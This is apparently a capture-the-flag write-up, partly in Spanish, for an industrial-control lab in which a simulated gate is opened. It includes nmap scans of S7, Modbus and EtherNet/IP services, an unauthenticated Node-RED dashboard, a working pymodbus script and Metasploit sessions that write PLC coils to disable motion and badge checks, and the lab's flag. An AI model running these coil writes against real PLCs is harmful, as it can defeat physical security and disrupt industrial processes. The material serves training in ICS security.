
# Task 3 - Breach


## Escaneo


```
nmap -sV -vv 10.10.234.154 --min-rate 5000 -p-
 
Initiating NSE at 20:41
Completed NSE at 20:41, 1.24s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 20:41
Completed NSE at 20:41, 1.43s elapsed
Nmap scan report for 10.10.234.154
Host is up, received reset ttl 61 (0.21s latency).
Scanned at 2025-06-26 20:37:18 CDT for 240s
Not shown: 64660 closed tcp ports (reset), 868 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON         VERSION
22/tcp    open  ssh           syn-ack ttl 61 OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http          syn-ack ttl 61 Werkzeug httpd 3.1.3 (Python 3.12.3)
102/tcp   open  iso-tsap      syn-ack ttl 61 Siemens S7 PLC
502/tcp   open  modbus        syn-ack ttl 61 Modbus TCP
1880/tcp  open  vsat-control? syn-ack ttl 61
8080/tcp  open  http          syn-ack ttl 61 Werkzeug httpd 2.3.7 (Python 3.12.3)
44818/tcp open  EtherNetIP-2? syn-ack ttl 61
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1880-TCP:V=7.95%I=7%D=6/26%Time=685DF623%P=aarch64-unknown-linux-gn
SF:u%r(GetRequest,799,"HTTP/1\.1\x20200\x20OK\r\nAccess-Control-Allow-Orig
SF:in:\x20\*\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Le
SF:ngth:\x201733\r\nETag:\x20W/\"6c5-hGVEFL4qpfS9qVbAlfbm9AL7VT0\"\r\nDate
SF::\x20Fri,\x2027\x20Jun\x202025\x2001:38:42\x20GMT\r\nConnection:\x20clo
SF:se\r\n\r\n<!DOCTYPE\x20html>\n<html>\n<head>\n<meta\x20charset=\"utf-8\
SF:">\n<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=\"IE=edge\">\n<m
SF:eta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-sc
SF:ale=1,\x20maximum-scale=1,\x20user-scalable=0\">\n<meta\x20name=\"apple
SF:-mobile-web-app-capable\"\x20content=\"yes\">\n<meta\x20name=\"mobile-w
SF:eb-app-capable\"\x20content=\"yes\">\n<!--\n\x20\x20Copyright\x20OpenJS
SF:\x20Foundation\x20and\x20other\x20contributors,\x20https://openjsf\.org
SF:/\n\n\x20\x20Licensed\x20under\x20the\x20Apache\x20License,\x20Version\
SF:x202\.0\x20\(the\x20\"License\"\);\n\x20\x20you\x20may\x20not\x20use\x2
SF:0this\x20file\x20except\x20in\x20compliance\x20with\x20the\x20License\.
SF:\n\x20\x20You\x20may\x20obtain\x20a\x20copy\x20of\x20the\x20License\x20
SF:at\n\n\x20\x20http://www\.apache\.org/licenses/LICENSE-2\.0\n\n\x20\x20
SF:Unless\x20required\x20by\x20applicable\x20law\x20or\x20agreed\x20to\x20
SF:in\x20writing,\x20softwa")%r(HTTPOptions,DF,"HTTP/1\.1\x20204\x20No\x20
SF:Content\r\nAccess-Control-Allow-Origin:\x20\*\r\nAccess-Control-Allow-M
SF:ethods:\x20GET,PUT,POST,DELETE\r\nVary:\x20Access-Control-Request-Heade
SF:rs\r\nContent-Length:\x200\r\nDate:\x20Fri,\x2027\x20Jun\x202025\x2001:
SF:38:42\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,DF,"HTTP/1
SF:\.1\x20204\x20No\x20Content\r\nAccess-Control-Allow-Origin:\x20\*\r\nAc
SF:cess-Control-Allow-Methods:\x20GET,PUT,POST,DELETE\r\nVary:\x20Access-C
SF:ontrol-Request-Headers\r\nContent-Length:\x200\r\nDate:\x20Fri,\x2027\x
SF:20Jun\x202025\x2001:38:43\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RP
SF:CCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r
SF:\n\r\n")%r(DNSVersionBindReqTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; Device: specialized; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 240.57 seconds
           Raw packets sent: 329526 (14.499MB) | Rcvd: 111160 (4.447MB)

```


- Mas especifico
```
nmap --script "modbus-discover,s7-info,enip-info" -p 502,102,44818 10.10.81.124
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-30 20:59 CST
Nmap scan report for 10.10.81.124
Host is up (0.20s latency).

PORT      STATE SERVICE
102/tcp   open  iso-tsap
| s7-info:
|   Module: 6ES7 315-2EH14-0AB0
|   Basic Hardware: 6ES7 315-2EH14-0AB0
|   Version: 3.2.6
|   System Name: SNAP7-SERVER
|   Module Type: CPU 315-2 PN/DP
|   Serial Number: S C-C2UR28922012
|_  Copyright: Original Siemens Equipment
502/tcp   open  modbus
| modbus-discover:
|   sid 0x1:
|_    error: ILLEGAL FUNCTION
44818/tcp open  EtherNetIP-2
```


## Puertos


http://10.10.217.30/
```
# Gate Status Monitor
Gate CLOSED
```


 http://10.10.217.30:1880/
```
Node-Red 
```

http://10.10.217.30:1880/ui

```
Motio Detection [ ]
Badage [  ]
```


## Solve 1

- En /ui desactivamos ambas opciones  y la puerta se abre
- Podemos checar el status en el web origina y la puerta se abrio

```
# Gate Status Monitor
Gate OPENED

THM{s4v3_th3_d4t3_27_jun3}
```

## Solve 2


By analyzing the JavaScript code within the function nodes, we discovered the precise logic for the gate controls:

- The **"Motion Detector"** system was controlled by the state of **Modbus Coil 20**
- The **"Badge"** system was controlled by the state of **Modbus Coil 25**

The key vulnerability was a combination of factors:

1. **Insecure Read Access**: The Node-RED editor allowed anonymous read access, exposing the entire control logic
2. **Lax PLC Permissions**: The PLC coils were discovered to be writable via the pymodbus library
3. **Counter-intuitive Logic**: The final logic required setting both coils to `FALSE`, not `TRUE`


- Python script

```python
from pymodbus.client import ModbusTcpClient

plc_ip   = '10.10.81.124'
tcp_port = 502
unit_id = 1

coil_motion = 20
coil_badge  = 25

client = ModbusTcpClient(plc_ip, port=tcp_port)

def list_coils():
    for coil in range(31):
        state = client.read_coils(coil, count=1, slave=unit_id).bits[0]
        print(f'Coil {coil:2} {"ON" if state else "OFF"}')
       
try:
    client.connect()
    print(f"[+] Connecting to {plc_ip}...")
    print(f"[+] Estatus de los coils")
    list_coils()
    print(f'\nIntentamos apagar los coils {coil_motion} y {coil_badge}')
    client.write_coil(coil_motion, False, slave=unit_id)
    client.write_coil(coil_badge, False, slave=unit_id)
    print(f"[+] Estatus de los coils")
    list_coils()

except Exception as e:
    print(f"\n[!] An error occurred: {e}")
finally:
    client.close()
    print("\n[+] Disconnected.")






```


## Solve 3 - metasploit

- Leer el estado de los coils

```
msf6 auxiliary(scanner/scada/modbusclient) > options 

Module options (auxiliary/scanner/scada/modbusclient):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   DATA                             no        Data to write (WRITE_COIL and WRITE_REGISTER modes on
                                              ly)
   DATA_ADDRESS    1                yes       Modbus data address
   DATA_COILS                       no        Data in binary to write (WRITE_COILS mode only) e.g.
                                              0110
   DATA_REGISTERS                   no        Words to write to each register separated with a comm
                                              a (WRITE_REGISTERS mode only) e.g. 1,2,3,4
   HEXDUMP         false            no        Print hex dump of response
   NUMBER          30               no        Number of coils/registers to read (READ_COILS, READ_D
                                              ISCRETE_INPUTS, READ_HOLDING_REGISTERS, READ_INPUT_RE
                                              GISTERS modes only)
   RHOSTS          10.10.178.137    yes       The target host(s), see https://docs.metasploit.com/d
                                              ocs/using-metasploit/basics/using-metasploit.html
   RPORT           502              yes       The target port (TCP)
   UNIT_NUMBER     1                no        Modbus unit number


Auxiliary action:

   Name        Description
   ----        -----------
   READ_COILS  Read bits from several coils



View the full module info with the info, or info -d command.
msf6 auxiliary(scanner/scada/modbusclient) > set action READ_COILS

msf6 auxiliary(scanner/scada/modbusclient) > run
[*] Running module against 10.10.178.137
[*] 10.10.178.137:502 - Sending READ COILS...
[+] 10.10.178.137:502 - 30 coil values from address 1 : 
[+] 10.10.178.137:502 - [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0]
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/scada/modbusclient) > 
```

- Modificar el estado de los coils
```
msf6 auxiliary(scanner/scada/modbusclient) > options 

Module options (auxiliary/scanner/scada/modbusclient):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   DATA            0                no        Data to write (WRITE_COIL and WRITE_REGISTER modes on
                                              ly)
   DATA_ADDRESS    25               yes       Modbus data address
   DATA_COILS                       no        Data in binary to write (WRITE_COILS mode only) e.g.
                                              0110
   DATA_REGISTERS                   no        Words to write to each register separated with a comm
                                              a (WRITE_REGISTERS mode only) e.g. 1,2,3,4
   HEXDUMP         false            no        Print hex dump of response
   NUMBER          25               no        Number of coils/registers to read (READ_COILS, READ_D
                                              ISCRETE_INPUTS, READ_HOLDING_REGISTERS, READ_INPUT_RE
                                              GISTERS modes only)
   RHOSTS          10.10.178.137    yes       The target host(s), see https://docs.metasploit.com/d
                                              ocs/using-metasploit/basics/using-metasploit.html
   RPORT           502              yes       The target port (TCP)
   UNIT_NUMBER     1                no        Modbus unit number


Auxiliary action:

   Name        Description
   ----        -----------
   WRITE_COIL  Write one bit to a coil


[*] Auxiliary module execution completed
msf6 auxiliary(scanner/scada/modbusclient) > set data_address 20
data_address => 20
msf6 auxiliary(scanner/scada/modbusclient) > run
[*] Running module against 10.10.178.137
[*] 10.10.178.137:502 - Sending WRITE COIL...
[+] 10.10.178.137:502 - Value 0 successfully written at coil address 20
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/scada/modbusclient) > set data_address 25
data_address => 25
msf6 auxiliary(scanner/scada/modbusclient) > run
[*] Running module against 10.10.178.137
[*] 10.10.178.137:502 - Sending WRITE COIL...
[+] 10.10.178.137:502 - Value 0 successfully written at coil address 25
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/scada/modbusclient) > 
```
## Referencias

https://github.com/hanimugiwara/THM-INDU-CTF/tree/main

